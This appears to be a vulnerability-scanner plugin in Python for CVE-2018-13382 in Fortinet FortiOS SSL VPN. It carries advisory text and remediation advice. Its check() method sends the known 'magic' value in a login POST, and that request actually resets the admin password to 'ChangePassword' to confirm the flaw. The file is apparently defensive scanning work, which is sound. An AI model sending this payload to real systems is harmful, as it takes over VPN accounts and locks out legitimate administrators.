"""Agent Asteroid implementation for CVE-2018-13382: Not tested on a live target."""

from urllib3 import exceptions
from urllib3 import disable_warnings

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

disable_warnings(exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 90
HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1",
}

VULNERABILITY_TITLE = (
    "An Improper Authorization vulnerability in Fortinet FortiOS: CVE-2018-13382"
)
VULNERABILITY_REFERENCE = "CVE-2018-13382"
VULNERABILITY_DESCRIPTION = (
    "An Improper Authorization vulnerability in the SSL VPN web portal may allow an "
    "unauthenticated attacker to change the password of an SSL VPN web portal user."
)
VULNERABILITY_SHORT_DESCRIPTION = "An Improper Authorization vulnerability in the SSL VPN web portal may allow an unauthenticated attacker to change the password of an SSL VPN web portal user ."
REFERENCES = {
    "Fortiguard advisory": "https://fortiguard.com/advisory/FG-IR-18-389",
    "Blog": "https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html",
}
RECOMMENDATION = """
    Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above. Mitigation: SSL VPN users with local 
    authentication can mitigate the impact by enabling Two-Factor Authentication (2FA): If their 
    password is changed by an attacker leveraging this vulnerability, the attacker will not be able to
    log in and use their SSL VPN account. 
"""
RISK_RATING = "CRITICAL"


@exploits_registry.register
class CVE201813382Exploit(definitions.Exploit):
    """CVE-2018-13382: An Improper Authorization vulnerability in Fortinet FortiOS."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        short_description=VULNERABILITY_SHORT_DESCRIPTION,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        recommendation=RECOMMENDATION,
        risk_rating=RISK_RATING,
        has_public_exploit=True,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2018-13382"],
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            url = f"{target.origin}/remote/login?lang=en"
            r = self.session.get(url, headers=HEADERS, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return r.status_code == 200 and "<title>Please Login</title>" in r.text

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        url = f"{target.origin}/remote/login?lang=en"
        # we are trying to change the password for the user : admin
        data = {
            "ajax": "1",
            "username": "admin",
            "realm": "",
            "credential": "YouAreVulnerable",
            "magic": "4tinet2095866",
            "reqid": "0",
            "credential2": "ChangePassword",
        }
        try:
            res = self.session.post(
                url, headers=HEADERS, data=data, timeout=DEFAULT_TIMEOUT
            )
        except requests_exceptions.RequestException:
            return []

        if res.status_code == 200 and "redir=/remote/hostcheck_install" in res.text:
            vulnerability = self.create_vulnerability(target)
            vulnerability.technical_detail = (
                f"{target.url} is vulnerable to CVE-2018-13382 : the admin user's"
                f" password being changed to `ChangePassword`."
            )
            return [vulnerability]
        else:
            return []
